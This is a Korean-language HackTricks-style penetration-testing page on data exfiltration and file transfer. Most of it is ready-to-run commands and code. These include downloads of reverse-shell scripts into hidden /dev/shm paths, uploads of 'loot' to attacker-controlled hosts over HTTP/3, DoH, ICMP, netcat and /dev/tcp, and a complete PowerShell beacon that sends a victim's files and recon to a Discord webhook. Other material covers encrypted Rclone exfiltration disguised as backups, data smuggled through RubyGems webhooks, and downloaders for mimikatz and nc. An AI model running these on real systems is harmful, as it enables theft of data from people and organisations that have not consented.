# 데이터 반출

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> `C:\Users\Public`에 loot을 준비하고 Rclone으로 반출하여 정상적인 백업처럼 보이게 하는 전체 예시는 아래 workflow를 참고하세요.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## 정보를 반출하는 데 흔히 허용되는 도메인

악용할 수 있는 흔히 허용되는 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요.

## Base64 복사\&붙여넣기

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### 파일 업로드

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**GET 및 POST 요청(헤더 포함)을 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python 모듈 [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS 서버**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

egress 제어가 classic **TCP/443** 검사에 맞춰 설정되어 있지만 **UDP/443**에는 관대하다면, **HTTP/3**를 강제해 전송이 TLS-over-TCP 대신 **QUIC**을 사용하도록 할 수 있습니다. 공격자 endpoint는 native HTTP/3를 지원해야 합니다(예: 이미 `Alt-Svc: h3`를 광고하는 reverse proxy 또는 업로드 endpoint).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

2025년 연구 논문(QUIC-Exfil)은 QUIC의 암호화된 헤더와 동적 주소 변경으로 인해 방화벽 수준에서 유출을 탐지하기가 TLS 또는 DNS 기반 채널보다 더 어려워질 수 있음을 밝혔으며, 유출을 서버 측 연결 마이그레이션으로 위장하는 서버 우선 주소 방식을 입증했습니다.<sup>[[9]](#references)</sup>

### 사전 서명 / 위임된 객체 스토리지 업로드

단기 **서명된 URL**을 발급하거나 확보할 수 있다면, 피해자는 일반 HTTPS 클라이언트만 있으면 됩니다. 따라서 호스트에 cloud SDK나 장기 자격 증명을 설치할 필요가 없습니다.<sup>[[8]](#references)</sup> 또한 일반적인 객체 스토리지 트래픽에 섞일 수 있습니다.

**Linux / macOS (AWS S3 사전 서명 `PUT`)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 사전 서명된 `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens는 보통 **경로**, **HTTP 메서드**, **만료 시간**으로 범위가 제한됩니다.<sup>[[8]](#references)[[10]](#references)</sup>
- Azure Blob `Put Blob`에서는 `x-ms-blob-type: BlockBlob`이 필수입니다.<sup>[[10]](#references)</sup>
- 이 패턴은 `curl`, `Invoke-WebRequest` 또는 raw HTTPS `PUT`을 실행할 수 있는 커스텀 implant와 잘 작동합니다.

### goshs

[goshs](https://github.com/patrickhener/goshs)는 `python3 -m http.server`를 대체하는 단일 바이너리입니다.<sup>[[4]](#references)</sup>
업로드, 다운로드, WebDAV, SFTP, SMB, TLS, 인증, 공유 링크, OOB 협업 기능(DNS, SMTP, NTLM hash 캡처)을 지원합니다.<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) for C2 및 데이터 유출

Webhooks는 JSON과 선택적 파일 파트를 받는 쓰기 전용 HTTPS 엔드포인트입니다. 일반적으로 신뢰할 수 있는 SaaS 도메인에 대한 연결이 허용되며 OAuth/API 키가 필요하지 않아, 낮은 부담으로 beaconing 및 데이터 유출을 수행하는 데 유용합니다.<sup>[[5]](#references)[[6]](#references)</sup>

주요 아이디어:
- 엔드포인트: Discord는 https://discord.com/api/webhooks/<id>/<token>을 사용합니다.
- payload_json이라는 파트에 {"content":"..."}를 포함하고, 선택적 파일 파트는 file이라는 이름으로 지정하여 POST multipart/form-data를 전송합니다.
- Operator 루프 패턴: 주기적 beacon -> 디렉터리 정찰 -> 대상 파일 유출 -> 정찰 결과 덤프 -> 대기. HTTP 204 NoContent/200 OK 응답으로 전송을 확인합니다.

PowerShell PoC (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

참고:
- 비슷한 패턴은 incoming webhook을 사용하는 다른 협업 플랫폼(Slack/Teams)에도 적용됩니다. URL과 JSON schema를 그에 맞게 조정하세요.
- Discord Desktop cache 아티팩트 및 webhook/API 복구에 대한 DFIR은 아래 관련 페이지를 참고하세요.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## 레지스트리 아티팩트를 반환 채널로 사용하기

코드가 이미 빌드 또는 문서화 worker에서 실행되고 패키지 레지스트리에 인증할 수 있다면, 레지스트리 자체를 반환 채널로 사용할 수 있습니다. GemStuffer 예제에서 한 payload는 가져온 응답 파일을 포함하는 **새 gem**을 빌드한 다음 RubyGems의 `/api/v1/gems`를 통해 push를 시도했습니다. 다른 payload는 가져온 응답을 `README.md`에 기록하고 `.yardopts` loader를 제거한 뒤 **같은 gem의 새 버전**을 publish하려고 했습니다. 이는 설치 시점 hook과는 별개이며, 유효한 publishing credential과 outbound registry access가 필요합니다.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

두 번째 변형은 outbound callback이 아닌 저장소로 레지스트리의 **webhook 설정**을 사용했습니다. 응답을 zlib으로 압축하고 URL-safe Base64로 인코딩한 뒤 padding을 제거하고, 최대 220자 길이의 번호가 매겨진 URL segment로 분할했습니다. webhook을 관리할 권한이 있는 key를 사용하면 `POST /api/v1/web_hooks`는 `gem_name`과 `url`을 받고, `GET /api/v1/web_hooks.json`은 해당 계정에 저장된 URL을 나열합니다. 번호가 매겨진 segment와 종료 marker를 사용하면 권한이 있는 reader가 데이터를 재구성할 수 있습니다. 예제의 `example.com` host는 저장된 값 안의 placeholder일 뿐, 작동하는 C2 endpoint나 성공적인 전달의 증거가 아닙니다.<sup>[[13]](#references)[[14]](#references)</sup>

```text
POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
```

초기 [YARD `.yardopts` 실행 경로](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds)에서 registry 채널은 실행 후에만 가능한 선택지입니다. 성공적인 `POST` 또는 이후에 읽을 수 있는 artifact는 별도로 확인해야 합니다. 인용된 사례는 주로 게시 및 등록 시도를 보여 줍니다.<sup>[[12]](#references)[[13]](#references)</sup>

## Rclone (cloud/object-storage를 통한 exfiltration)

요즘 operator들은 흔히 **loot를 로컬에 staging한 다음** [Rclone](https://rclone.org/)을 사용해 전송이 일반적인 backup 또는 sync 작업처럼 보이게 합니다. 실용적인 패턴은 다음과 같습니다.

1. 일반 remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. **내용과 파일명을 client-side에서 암호화**하는 `crypt` wrapper
3. provider가 object 크기 제한을 적용하거나 더 작은 upload 단위를 원하는 경우 선택적으로 사용하는 `chunker` wrapper

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

참고:
- `crypt`는 파일 내용과 이름을 모두 암호화할 수 있습니다.<sup>[[3]](#references)</sup>
- `chunker`는 큰 파일을 투명하게 분할하고 다운로드할 때 다시 조립합니다.<sup>[[11]](#references)</sup>
- `rclone.conf`는 `crypt` 비밀 정보를 강력한 저장 데이터 보호가 아닌 **난독화된** 형태로 저장합니다.<sup>[[3]](#references)</sup> 단기간 사용하는 작업에는 전용 임시 config를 사용하고 이후 삭제하는 것이 좋습니다. 더 오래 보관해야 한다면, 디스크에 일반 `rclone.conf`를 남기는 대신 암호화된 config 처리 방식(`RCLONE_CONFIG_PASS` / `--password-command`)을 사용하는 것이 좋습니다.<sup>[[11]](#references)</sup>
- 대상에서 이미 **OneDrive**, **Google Drive** 또는 **Dropbox**를 동기화하고 있다면, 동기화된 디렉터리에 loot를 복사하여 새 전송 바이너리를 배포하는 대신 이미 승인된 클라이언트를 이용할 수 있습니다.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP 서버 (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP 서버 (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP 서버 (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** 클라이언트

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

서버로서의 Kali

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

또는 **samba를 사용해** smb 공유를 생성합니다:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs)는 SMB를 통해 파일을 제공하고 연결하는 클라이언트의 NTLM 해시를 캡처하는 단일 바이너리 대안입니다.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

공격자는 SSHd가 실행 중인 상태여야 합니다.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

피해자가 SSH를 사용한다면 공격자는 피해자의 디렉터리를 공격자 시스템에 마운트할 수 있습니다.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### 피해자로부터 파일 다운로드

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### 피해자에게 파일 업로드

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

**@BinaryShadow\_**께 감사드립니다

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

기존 UDP/53 DNS 트래픽이 눈에 띄거나 차단되어 있지만 외부 HTTPS 연결은 대체로 허용되는 경우, 일반적인 DNS 라벨 기반 데이터 유출 패턴을 공개 resolver로 보내는 **DoH** 요청에 넣을 수 있습니다. 각 라벨은 DNS의 63바이트 제한보다 충분히 짧게 유지하고 Base32와 같이 DNS에서 사용할 수 있는 문자를 사용하세요.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

`exf.attacker.tld`의 authoritative DNS 서버에서 쿼리를 숫자 접두사 기준으로 정렬하고 Base32 스트림을 재구성합니다. 이렇게 하면 classic UDP/53 DNS 대신 resolver로 향하는 HTTPS 내부에서 전송할 수 있습니다.<sup>[[2]](#references)</sup>

양방향 DNS tunnel 도구(`iodine`, `dnscat2` 등)는 [tunneling 페이지](tunneling-and-port-forwarding.md)를 참조하세요.

## **SMTP**

SMTP 서버로 데이터를 보낼 수 있다면, python으로 데이터를 수신하는 SMTP 서버를 만들 수 있습니다:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs)는 OOB exfiltration 시나리오에서 이메일 callback을 수신할 간단한 SMTP server를 빠르게 실행할 수 있습니다.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

수신된 이메일과 콜백은 터미널 출력에 직접 표시됩니다.
DNS 콜백 서버와 결합해 완전한 OOB 커버리지를 확보할 수 있습니다:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

XP 및 2003에서는 기본적으로 사용할 수 있습니다(그 외 버전에서는 설치 중에 명시적으로 추가해야 합니다).

Kali에서 **TFTP server 시작**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Python으로 TFTP 서버:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

**피해자**에서 Kali server에 연결합니다:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

PHP oneliner를 사용해 파일 다운로드:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**피해자**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

`debug.exe` 프로그램은 바이너리를 검사할 수 있을 뿐 아니라 **hex를 사용해 바이너리를 재구성하는 기능**도 제공합니다. 즉, 바이너리의 hex를 제공하면 `debug.exe`가 바이너리 파일을 생성할 수 있습니다. 하지만 debug.exe에는 **최대 64kb 크기의 파일만 조립할 수 있다는 제한**이 있습니다.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

그런 다음 텍스트를 복사해 windows-shell에 붙여넣으면 nc.exe라는 파일이 생성됩니다.

## References

- [1] [Windows로 파일 전송하기](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [C2로서의 Discord와 남겨진 캐시 증거](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Webhook 실행](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (캐시 파서)](https://github.com/jwdfir/discord_cache_parser)
- [8] [사전 서명된 URL로 객체 업로드하기 - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: 데이터 유출 공격을 수행하기 위한 QUIC의 Server Preferred Address 기능 악용](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone 문서](https://rclone.org/docs/#configuration-encryption)
- [12] [RubyHack – RubyGems 및 RubyDoc 조사](https://www.rubyhack.ai/)
- [13] [JFrog Security Research – GemStuffer 분석](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
- [14] [RubyGems.org API – gem 및 webhook 메서드](https://guides.rubygems.org/rubygems-org-api/)
{{#include ../banners/hacktricks-training.md}}
